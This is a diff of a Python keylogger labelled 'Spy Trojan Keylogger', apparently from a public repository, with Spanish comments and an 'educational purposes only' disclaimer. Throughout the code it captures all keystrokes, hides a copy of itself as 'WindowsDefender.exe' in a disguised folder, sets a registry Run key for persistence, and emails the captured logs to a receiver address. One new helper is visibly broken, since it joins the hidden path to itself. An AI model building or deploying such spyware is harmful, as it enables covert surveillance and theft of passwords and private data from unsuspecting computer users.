@@ -1,15 +1,16 @@
-#██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
-#██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
-#█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
-#██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
-#██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
-#░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
-#░██║░░██╗░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
-#░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
-#░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
-#░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
-#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.2
+# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
+# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
+# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
+# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
+# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
+# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝
+
+# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
+# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
+# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
+# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
+# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -25,6 +26,7 @@ from winreg import *
 import socket
 import time
 import threading # Hilos
+
 
 # Convierte tecla a un valor legible
 def KeyConMin(argument):                # Caracteres Comunes // Optimizados
@@ -194,28 +196,22 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
 # Obtiene registro de teclas y guarda en un archivo log.txt
 def Klogger():
     try:        # Intenta crear el archivo
-        log = os.environ.get(
-        'pylogger_file',
-        os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
-        )
-    
+        log = os.environ.get('pylogger_file', os.path.expanduser(GetPathOcult()+LogName()) )
         T = datetime.datetime.now()
         getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
 
         with open (log, "a") as f:
             f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
     except: # Si no puede crear el archivo, crea el directorio faltante
-        CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+        CreateDir()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
     
     def on_press(key):
         with open(log, "a") as f:
             if (len(str(key)))  <= 3:
-                #print("[KeyConMin]")
-                print(KeyConMin(str(key)))
+                print("Se oprimio la tecla: "+KeyConMin(str(key))) 
                 f.write(KeyConMin(str(key)))
             else:
-                #print("[KeyConMax]")
-                print(KeyConMax(str(key)))
+                print("Se oprimio la tecla: "+KeyConMax(str(key)))
                 f.write(KeyConMax(str(key)))
     with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
         listener.join() 
@@ -244,8 +240,8 @@ def Rename(name):
     try:
         CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
         # Copia el archivo 
-        pathO = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
-        pathN= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
+        pathO = GetPathOcult()+ LogName()
+        pathN = GetPathOcult()+ name + ".txt"
         os.rename(pathO, pathN)
     except:
         pass
@@ -263,23 +259,20 @@ def VerificarConexion():
 # Crea el directorio oculto 
 def CreateDir():
     try:  # Intenta crear la dirección
-        os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
+        os.makedirs(GetPathOcult())
     except :
         pass
 
 # Cópia él Keylogger a la carpeta oculta 
 def EscondeKey():
     CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-    nameKey = "WindowsDefender.exe"
-    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
-
     try:
-        with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
-            print("El keylogger ya se encuentra en la carpeta oculta")
+        with open(FilePath(), 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
+            print("El keylogger ya se encontraba oculta en la carpeta: \n[C:\\Users\Public\\Security\\Windows Defender\\]")
     except :
-        print("El Keylogger no se encuentra en el sistema, y tratará de copiarlo")
+        print("El Keylogger no se encuentra escondido...\nSe tratará de esconderlo...")
         try:
-            shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
+            shutil.copy(GetNameKey() , FilePath()) # Intenta ocultar el keylogger en una carpeta
             print("El keylogger se escondió exitosamente en el sistema")
         except:
             print("No se puedo esconder el Keylogger en el sistema")
@@ -309,13 +302,13 @@ def SendLog():
 
         if VerificarConexion(): # Continua solo si hay conexión
             # Crea nombre del archivo
-            nameFile = "log"+str(n)
+            nameFile = str(n)
             #Renombra el archivo original
             Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`
 
             #Envía el archivo renombrado
             CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
+            homedir = GetPathOcult()+str(nameFile)+".txt"
             print("Proceso de envío")
 
             if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Envía con el primer correo
@@ -325,16 +318,15 @@ def SendLog():
                 os.remove(homedir)
         else:   # No hay conexión
             # Seguirá sobreescribiendo el archivo
-            # No hará nada, y esperará que aya una conexión exitosa
-            pass
-        
+            # No hará nada, y esperará que haya una conexión exitosa
+            pass     
 def addStartup():  # function =  Iniciar automaticamente
-    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe" # Path del Software completo
-    name = "Windows Defender"                                                       # Nombre del StartUp
+    path = GetPathOcult()+ GetNameKey() # Path del Software completo
+    name = "Keylogger"                                                              # Nombre del StartUp     // Solo se ve en el registro *Regedit*
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():
         try:  # Intenta crear la dirección
-            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
+            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup
             return True # Se creó la carpeta
         except:
             return False# La carpeta ya existe
@@ -346,16 +338,26 @@ def addStartup():  # function =  Iniciar automaticamente
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
             SetValueEx(registry,name, 0, REG_SZ, path)
-           
+    # Personalizar Keylogger
+
+def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
+    return "WindowsDefender.exe"    
+def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y el registro de teclas
+    return "C:\\Users\\Public\\Security\\Windows Defender\\"
+def LogName():  # 
+    return ".key"
+def FilePath():
+    return str(GetPathOcult()+GetPathOcult())
+          
     
 
 # Inicio multihilo
 if __name__ == '__main__':
     
     EscondeKey()    # Se replica dentro de la computadora
-    addStartup()    # Modifica registro
-    p1 = threading.Thread(target=Klogger)
-    p2 = threading.Thread(target=SendLog)
+    addStartup()    # Modifica registro de arranque
+    p1 = threading.Thread(target=Klogger)   # Registra teclas
+    p2 = threading.Thread(target=SendLog)   # Enviar Registro
     p2.start()
     p1.start()
     p1.join()
@@ -363,11 +365,11 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.3.2       #
+#                                                   v.3.3       #
 #################################################################
-# Notas importantes
+# NOTAS IMPORTANTES:
 #
 # *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
 #
-# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python
+# Lea la documentación antes de usar: https://github.com/SebastianEPH/Keylogger_Python
 
